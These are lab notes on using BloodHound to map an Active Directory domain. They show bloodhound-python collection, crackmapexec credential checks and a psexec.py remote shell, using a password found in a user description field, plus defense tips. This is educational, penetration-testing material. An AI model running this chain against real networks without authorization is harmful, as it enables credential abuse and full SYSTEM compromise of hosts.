# 🧠 BloodHound & Privilege Escalation Notes

## 📌 Overview

This lab demonstrates how to use BloodHound to analyze an Active Directory environment, identify weak configurations, and perform privilege escalation using exposed credentials.

---

## 🔍 Key Concepts

### 1. Active Directory Enumeration

- Enumeration is the process of gathering information about the domain
- Includes users, groups, computers, and permissions
- Most important phase before exploitation

---

### 2. BloodHound

- BloodHound is used to visualize AD relationships
- It helps identify attack paths
- Works by importing collected data (JSON files)

---

### 3. Data Collection

```bash
bloodhound-python -d YOURDOMAIN.local -u <USERNAME> -p '<PASSWORD>' -ns <TARGET_IP> -c all
```

- Collects domain data using LDAP and other protocols
- Generates JSON files for analysis

---

### 4. Important BloodHound Checks

When analyzing users:

- Check **Description field**
- Check **Group Membership**
- Check **Admin Rights**
- Check **Sessions**

---

## ⚠️ Common Misconfiguration

### 🔴 Password in Description Field

- Storing passwords in description is a critical mistake
- Any authenticated user can read it
- Leads to credential exposure

---

## 🚀 Exploitation Flow

### Step 1: Identify Weak User

- Example: SQLService account
- Found via BloodHound analysis

---

### Step 2: Extract Credentials

- Password found in description field

---

### Step 3: Validate Credentials

```bash
crackmapexec smb <TARGET_NETWORK> -u <USERNAME> -p '<PASSWORD>'
```

- Confirms access
- Shows if user has admin privileges

---

### Step 4: Get Remote Shell

```bash
psexec.py YOURDOMAIN.local/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
```

- Provides SYSTEM-level access
- Allows full control of the target machine

---

## 🎯 Key Commands Summary

```bash
# Data Collection
bloodhound-python -d YOURDOMAIN.local -u <USERNAME> -p '<PASSWORD>' -ns <TARGET_IP> -c all

# Credential Validation
crackmapexec smb <TARGET_NETWORK> -u <USERNAME> -p '<PASSWORD>'

# Remote Access
psexec.py YOURDOMAIN.local/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
```

---

## 🧠 Important Learnings

- Enumeration is more important than exploitation
- Small misconfigurations can lead to full compromise
- BloodHound simplifies complex AD relationships
- Always check description fields and permissions

---

## 🔐 Defense Tips

- Never store credentials in description fields
- Apply least privilege principle
- Monitor user permissions regularly
- Restrict access to sensitive attributes

---

## ⚠️ Notes

- Machines must be ON during data collection
- BloodHound data may be incomplete if environment is not fully running
- Always verify credentials before exploitation

---

## 📚 Use Case (Real World)

- Internal network penetration testing
- Red Team assessments
- Security audits for Active Directory environments
